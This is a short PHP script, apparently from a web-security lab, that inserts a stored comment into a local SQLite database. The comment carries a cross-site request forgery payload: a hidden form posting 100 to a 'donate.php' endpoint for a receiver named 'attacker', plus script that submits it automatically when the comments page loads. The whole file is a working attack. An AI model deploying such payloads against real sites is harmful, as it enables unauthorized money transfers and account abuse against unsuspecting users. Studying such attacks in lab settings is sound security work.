<?php
$db = new SQLite3(dirname(__FILE__) . '/private/database.db');

// Payload CSRF automático - se envía sin interacción del usuario
$csrf_auto_payload = 'Buen jugador!<form id="autoForm" action="http://web.pagos/donate.php" method="POST">
<input type="hidden" name="amount" value="100">
<input type="hidden" name="receiver" value="attacker">
</form>
<script>document.getElementById("autoForm").submit();</script>';

$playerId = 4; // Noah Bonet
$userId = 2;   // luis

$stmt = $db->prepare('INSERT INTO comments (playerId, userId, body) VALUES (:playerId, :userId, :body)');
$stmt->bindValue(':playerId', $playerId, SQLITE3_INTEGER);
$stmt->bindValue(':userId', $userId, SQLITE3_INTEGER);
$stmt->bindValue(':body', $csrf_auto_payload, SQLITE3_TEXT);
$stmt->execute();

echo "Comentario con CSRF automático insertado.\n";
echo "Ahora accede a: http://localhost:3000/web/show_comments.php?id=4\n";
echo "El formulario se enviará automáticamente sin hacer clic.\n";
?>
